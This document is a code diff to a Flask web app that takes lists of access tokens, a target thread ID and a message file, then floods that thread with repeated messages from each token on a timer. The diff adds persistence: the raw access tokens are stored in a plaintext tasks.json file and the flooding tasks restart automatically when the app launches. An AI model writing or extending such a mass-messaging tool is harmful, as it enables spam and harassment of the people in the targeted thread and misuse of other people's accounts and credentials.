@@ -5,29 +5,25 @@ from threading import Thread, Event
 import time
 import random
 import string
- 
+import json
+import os
+import sys
+
 app = Flask(__name__)
 app.debug = False
- 
+
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
 }
- 
+
 stop_events = {}
 threads = {}
-
-# Error handler to catch exceptions and log them
-@app.errorhandler(Exception)
-def handle_error(error):
-    return f"An error occurred: {str(error)}", 500
 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
@@ -44,40 +40,88 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                     if response.status_code == 200:
                         print(f"Message Sent Successfully From token {access_token}: {message}")
                     else:
-                        print(f"Message Sent Failed From token {access_token}: {message}")
+                        print(f"Message Sent Failed From token {access_token}: {message}, Status Code: {response.status_code}")
                 except Exception as e:
                     print(f"Error sending message from token {access_token}: {str(e)}")
                 time.sleep(time_interval)
- 
+
+    remove_task(task_id)
+
+def save_task(task_id, access_tokens, thread_id, mn, time_interval, messages):
+    task_info = {
+        'task_id': task_id,
+        'access_tokens': access_tokens,
+        'thread_id': thread_id,
+        'mn': mn,
+        'time_interval': time_interval,
+        'messages': messages,
+    }
+    if os.path.exists('tasks.json'):
+        with open('tasks.json', 'r+') as file:
+            data = json.load(file)
+            data[task_id] = task_info
+            file.seek(0)
+            json.dump(data, file)
+            file.truncate()
+    else:
+        with open('tasks.json', 'w') as file:
+            json.dump({task_id: task_info}, file)
+
+def remove_task(task_id):
+    if os.path.exists('tasks.json'):
+        with open('tasks.json', 'r+') as file:
+            data = json.load(file)
+            if task_id in data:
+                del data[task_id]
+                file.seek(0)
+                json.dump(data, file)
+                file.truncate()
+
+def restart_tasks():
+    if os.path.exists('tasks.json'):
+        with open('tasks.json', 'r') as file:
+            tasks = json.load(file)
+            for task_id, task_info in tasks.items():
+                access_tokens = task_info['access_tokens']
+                thread_id = task_info['thread_id']
+                mn = task_info['mn']
+                time_interval = task_info['time_interval']
+                messages = task_info['messages']
+                
+                stop_events[task_id] = Event()
+                thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+                threads[task_id] = thread
+                thread.start()
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
-        
+
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
- 
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
- 
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
- 
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
- 
+
         stop_events[task_id] = Event()
+        save_task(task_id, access_tokens, thread_id, mn, time_interval, messages)
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
- 
+
         return f'Task started with ID: {task_id}'
- 
-    return render_template_string('''
-<!DOCTYPE html>
+
+    return render_template_string('''<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
@@ -197,9 +241,8 @@ def send_message():
     }
   </script>
 </body>
-</html>
-''')
- 
+</html>''')
+
 @app.route('/stop', methods=['POST'])
 def stop_task():
     task_id = request.form.get('taskId')
@@ -208,6 +251,7 @@ def stop_task():
         return f'Task with ID {task_id} has been stopped.'
     else:
         return f'No task found with ID {task_id}.'
- 
+
 if __name__ == '__main__':
+    restart_tasks()  # Restart any ongoing tasks
     app.run(host='0.0.0.0', port=5000)
